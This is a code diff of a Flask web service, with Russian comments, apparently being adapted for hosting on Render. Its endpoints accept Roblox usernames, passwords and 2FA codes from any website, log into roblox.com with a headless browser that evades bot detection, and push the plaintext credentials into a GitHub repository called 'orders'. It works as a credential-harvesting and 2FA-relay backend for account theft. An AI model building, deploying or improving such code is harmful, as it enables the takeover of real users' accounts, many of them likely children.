@@ -17,11 +17,10 @@ from webdriver_manager.chrome import ChromeDriverManager
 from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
 import git
 import json
-# Добавьте в начало файла
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)  # Разрешить CORS для всех доменов
+CORS(app)
 
 @app.after_request
 def after_request(response):
@@ -30,15 +29,14 @@ def after_request(response):
     response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
     return response
 
-# КОНФИГУРАЦИЯ
-ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"  # Замените на ваш репозиторий
+# Конфигурация
+ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"
 ORDERS_DIR = "orders"
 SCREENSHOT_DIR = "screenshots"
 MAX_LOGIN_ATTEMPTS = 3
 REQUEST_TIMEOUT = 30
 
-
-# НАСТРОЙКА ЛОГГИРОВАНИЯ
+# Настройка логирования
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
@@ -49,34 +47,45 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
 def get_chrome_options():
-    """Возвращает настройки для Chrome"""
+    """Возвращает настройки для Chrome с учетом работы на Render"""
     options = Options()
+    options.binary_location = "/opt/render/.cache/chromium/chrome-linux/chrome"  # Путь к Chrome на Render
+    
     options.add_argument("--headless=new")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--window-size=1920,1080")
+    options.add_argument("--disable-gpu")
+    options.add_argument("--disable-extensions")
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_experimental_option("excludeSwitches", ["enable-automation"])
     options.add_experimental_option("useAutomationExtension", False)
-    options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 115)}.0.0.0 Safari/537.36")
+    
+    # Случайный user-agent
+    chrome_version = random.randint(100, 115)
+    options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36")
+    
     return options
 
+def install_chrome():
+    """Устанавливает Chrome на Render"""
+    os.system("apt-get update")
+    os.system("apt-get install -y chromium-browser")
+
 def generate_filename():
-    """Генерирует имя файла для сохранения данных"""
+    """Генерирует имя файла"""
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     return f"account_{timestamp}_{rand_str}.json"
 
 def init_repository():
-    """Инициализирует или обновляет git репозиторий"""
+    """Инициализирует git репозиторий"""
     try:
         if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
             repo = git.Repo(ORDERS_DIR)
             repo.git.pull()
-            logger.info("Репозиторий успешно обновлен")
+            logger.info("Репозиторий обновлен")
         else:
             if os.path.exists(ORDERS_DIR):
                 for item in os.listdir(ORDERS_DIR):
@@ -85,14 +94,14 @@ def init_repository():
             
             repo_url = f"https://{os.getenv('GITHUB_USERNAME')}:{os.getenv('GITHUB_TOKEN')}@{ORDERS_REPO.split('https://')[1]}"
             git.Repo.clone_from(repo_url, ORDERS_DIR)
-            logger.info("Репозиторий успешно клонирован")
+            logger.info("Репозиторий клонирован")
         return True
     except Exception as e:
         logger.error(f"Ошибка работы с репозиторием: {str(e)}")
         return False
 
 def save_account_data(data):
-    """Сохраняет данные аккаунта в репозиторий"""
+    """Сохраняет данные аккаунта"""
     try:
         if not init_repository():
             return False
@@ -119,36 +128,11 @@ def human_like_delay(min_sec=0.1, max_sec=0.5):
     """Имитирует человеческую задержку"""
     time.sleep(random.uniform(min_sec, max_sec))
 
-def simulate_human_interaction(driver):
-    """Имитирует человеческое поведение"""
-    try:
-        # Случайные движения мышью
-        actions = ActionChains(driver)
-        actions.move_by_offset(random.randint(-20, 20), random.randint(-20, 20)).perform()
-        human_like_delay()
-        
-        # Случайный скролл
-        scroll_amount = random.randint(100, 300) * (1 if random.random() > 0.5 else -1)
-        driver.execute_script(f"window.scrollBy(0, {scroll_amount});")
-        human_like_delay()
-        
-        # Антидетект
-        driver.execute_script("""
-            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-            Object.defineProperty(navigator, 'plugins', {
-                get: () => [1, 2, 3, 4, 5]
-            });
-        """)
-    except Exception as e:
-        logger.warning(f"Ошибка имитации поведения: {str(e)}")
-
-
-# ОСНОВНАЯ ЛОГИКА БОТА
 def process_login(username, password, code_2fa=None):
     """Обрабатывает вход в аккаунт"""
     driver = None
     try:
-        # Инициализация драйвера
+        # Установка ChromeDriver
         service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=get_chrome_options())
         
@@ -157,20 +141,18 @@ def process_login(username, password, code_2fa=None):
             "userAgent": driver.execute_script("return navigator.userAgent;").replace("Headless", "")
         })
         
-        # Открытие страницы входа
+        # Логин процесс
         driver.get("https://www.roblox.com/login")
         human_like_delay(1, 2)
         
-        # Закрытие cookie-баннера (если есть)
         try:
             cookie_btn = WebDriverWait(driver, 3).until(
-                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept') or contains(., 'Принять')]")))
+                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
             cookie_btn.click()
             human_like_delay()
         except:
             pass
         
-        # Ввод данных
         username_field = WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.ID, "login-username")))
         username_field.send_keys(username)
@@ -180,12 +162,10 @@ def process_login(username, password, code_2fa=None):
         password_field.send_keys(password)
         human_like_delay()
         
-        # Клик по кнопке входа
         login_btn = driver.find_element(By.ID, "login-button")
         login_btn.click()
         human_like_delay(1, 2)
         
-        # Проверка на 2FA
         if code_2fa:
             try:
                 code_field = WebDriverWait(driver, 5).until(
@@ -193,18 +173,16 @@ def process_login(username, password, code_2fa=None):
                 code_field.send_keys(code_2fa)
                 human_like_delay()
                 
-                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify') or contains(., 'Подтвердить')]")
+                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                 submit_btn.click()
                 human_like_delay(2, 3)
             except Exception as e:
-                return {'status': '2fa_error', 'message': f'2FA processing failed: {str(e)}'}
+                return {'status': '2fa_error', 'message': f'2FA error: {str(e)}'}
         
-        # Проверка успешного входа
         try:
             WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container') or contains(@class, 'user-info')]")))
+                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
             
-            # Сбор данных аккаунта
             account_data = {
                 'username': username,
                 'password': password,
@@ -218,12 +196,11 @@ def process_login(username, password, code_2fa=None):
             return {'status': 'success', 'data': account_data}
             
         except TimeoutException:
-            # Проверка ошибок
             error_msg = check_for_errors(driver)
             if error_msg:
                 return {'status': 'error', 'message': error_msg}
             
-            return {'status': 'unknown_error', 'message': 'Unknown login error'}
+            return {'status': 'unknown_error', 'message': 'Unknown error'}
             
     except Exception as e:
         logger.error(f"Critical error: {str(e)}")
@@ -269,18 +246,18 @@ def check_for_errors(driver):
     
     return None
 
+@app.route('/')
+def home():
+    return jsonify({"status": "ok", "message": "Service is running"})
 
-# API ENDPOINTS
+@app.route('/health', methods=['GET'])
+def health_check():
+    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})
+
 @app.route('/process_login', methods=['POST'])
 def handle_login():
-    """Обрабатывает запрос на вход"""
-    # Добавляем CORS заголовки
     if request.method == 'OPTIONS':
-        response = jsonify({'status': 'ok'})
-        response.headers.add('Access-Control-Allow-Origin', '*')
-        response.headers.add('Access-Control-Allow-Headers', '*')
-        response.headers.add('Access-Control-Allow-Methods', '*')
-        return response
+        return jsonify({'status': 'ok'}), 200
 
     if not request.is_json:
         return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
@@ -299,25 +276,16 @@ def handle_login():
     logger.info(f"Processing login for: {username}")
     result = process_login(username, password)
     
-    response = jsonify(result)
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    
     if result['status'] == 'success':
         if not save_account_data(result['data']):
             return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
     
-    return response
+    return jsonify(result)
 
 @app.route('/submit_2fa', methods=['POST'])
 def handle_2fa():
-    """Обрабатывает 2FA код"""
-    # Добавляем CORS заголовки
     if request.method == 'OPTIONS':
-        response = jsonify({'status': 'ok'})
-        response.headers.add('Access-Control-Allow-Origin', '*')
-        response.headers.add('Access-Control-Allow-Headers', '*')
-        response.headers.add('Access-Control-Allow-Methods', '*')
-        return response
+        return jsonify({'status': 'ok'}), 200
 
     if not request.is_json:
         return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
@@ -337,31 +305,22 @@ def handle_2fa():
     logger.info(f"Processing 2FA for: {username}")
     result = process_login(username, password, code)
     
-    response = jsonify(result)
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    
     if result['status'] == 'success':
         if not save_account_data(result['data']):
             return jsonify({'status': 'error', 'message': 'Data save failed'}), 500
     
-    return response
-
-@app.route('/health', methods=['GET'])
-def health_check():
-    """Проверка работоспособности сервиса"""
-    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})
-
-@app.route('/')
-def home():
-    return jsonify({"status": "ok", "message": "Service is running"})
+    return jsonify(result)
 
 @app.before_request
 def log_request():
     logger.info(f"Incoming request: {request.method} {request.url}")
 
-
-# Измените запуск сервера в конце файла:
 if __name__ == '__main__':
+    # Установка Chrome при первом запуске
+    if not os.path.exists("/opt/render/.cache/chromium"):
+        logger.info("Installing Chrome...")
+        install_chrome()
+    
     # Проверка переменных окружения
     required_env_vars = ['GITHUB_USERNAME', 'GITHUB_TOKEN']
     for var in required_env_vars:
@@ -369,13 +328,10 @@ if __name__ == '__main__':
             logger.error(f"Missing required environment variable: {var}")
             exit(1)
     
-    # Создание необходимых директорий
+    # Создание директорий
     os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+    os.makedirs(ORDERS_DIR, exist_ok=True)
     
     # Запуск сервера
-    port = int(os.getenv('PORT', 5000))
+    port = int(os.getenv('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
-
-
-
-
